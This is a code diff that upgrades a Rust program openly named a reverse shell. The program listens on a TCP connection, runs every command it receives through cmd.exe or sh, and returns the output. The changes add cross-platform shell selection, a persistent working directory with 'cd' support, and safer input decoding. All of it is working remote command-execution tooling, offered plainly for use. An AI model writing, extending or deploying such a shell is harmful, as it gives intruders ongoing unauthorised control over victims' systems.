@@ -1,11 +1,14 @@
 use std::io::{Read, Write};
 use std::net::{TcpListener, TcpStream};
-use std::process::Command;
+use std::process::{Command, Stdio};
+use std::path::PathBuf;
+use std::env;
 use std::io;
 
 pub struct Client {
     handle: TcpStream,
     input_buf: [u8; 1024],
+    current_dir: PathBuf,  // Track the current directory
 }
 
 impl Client {
@@ -14,16 +17,19 @@ impl Client {
         Ok(Self {
             handle: stream,
             input_buf: [0; 1024],
+            current_dir: env::current_dir()?,  // Start in the current directory
         })
     }
 
     pub fn read(&mut self) -> Result<String, io::Error> {
         // Read into the buffer
-        self.handle.read(&mut self.input_buf)?;
+        let bytes_read = self.handle.read(&mut self.input_buf)?;
 
-        // Convert the buffer to a string before clearing it
-        let s = unsafe { std::str::from_utf8_unchecked(&self.input_buf) }
-            .trim();  // This will safely trim the string
+        // Convert the buffer to a string, making sure to handle null bytes properly
+        let s = match std::str::from_utf8(&self.input_buf[..bytes_read]) {
+            Ok(valid_str) => valid_str.trim(),  // Safely trim and ignore any leading/trailing whitespace
+            Err(_) => return Err(io::Error::new(io::ErrorKind::InvalidData, "Invalid UTF-8")),
+        };
 
         // Clear the buffer after creating the string reference
         let result = s.to_string();
@@ -37,6 +43,17 @@ impl Client {
         self.handle.write_all(s.as_bytes())?;
         Ok(())
     }
+
+    // Update the current working directory
+    pub fn change_directory(&mut self, dir: String) -> Result<(), io::Error> {
+        let new_dir = self.current_dir.join(dir);
+        if new_dir.exists() && new_dir.is_dir() {
+            self.current_dir = new_dir;
+            Ok(())
+        } else {
+            Err(io::Error::new(io::ErrorKind::NotFound, "Directory not found"))
+        }
+    }
 }
 
 pub fn start_reverse_shell() -> Result<(), io::Error> {
@@ -48,6 +65,9 @@ pub fn start_reverse_shell() -> Result<(), io::Error> {
 
     println!("Client connected.");
 
+    // Detect the operating system (for now, let's assume we're on Windows or Unix)
+    let is_windows = std::env::consts::OS == "windows";
+
     loop {
         let input = client.read()?;
 
@@ -55,18 +75,35 @@ pub fn start_reverse_shell() -> Result<(), io::Error> {
             break;
         }
 
-        println!("Received command: {}", input);
-
-        // Execute the received command in cmd (Windows)
-        let output = Command::new("cmd.exe")
-            .args(&["/c", &input])  // "/c" is for executing the command
-            .output()?;
-
-        if !output.status.success() {
-            client.write("Command execution failed.".to_string())?;
+        // Check if the command is `cd <dir>`
+        if input.starts_with("cd ") {
+            let dir = input[3..].trim().to_string();
+            if let Err(e) = client.change_directory(dir) {
+                client.write(format!("Error: {}", e))?;
+            } else {
+                client.write(format!("Changed directory to: {}", client.current_dir.display()))?;
+            }
         } else {
-            let result = String::from_utf8_lossy(&output.stdout);
-            client.write(result.to_string())?;
+            // For all other commands, run them in the current directory
+            let mut command = if is_windows {
+                Command::new("cmd.exe")
+                    .args(&["/c", &input])  // "/c" is for executing the command
+                    .current_dir(&client.current_dir)
+                    .output()?
+            } else {
+                Command::new("sh")
+                    .arg("-c")
+                    .arg(&input)  // Linux/Unix uses sh to execute commands
+                    .current_dir(&client.current_dir)
+                    .output()?
+            };
+
+            if !command.status.success() {
+                client.write("Command execution failed.".to_string())?;
+            } else {
+                let result = String::from_utf8_lossy(&command.stdout);
+                client.write(result.to_string())?;
+            }
         }
     }
 
@@ -77,4 +114,3 @@ fn main() -> Result<(), io::Error> {
     // Start the reverse shell server
     start_reverse_shell()
 }
-
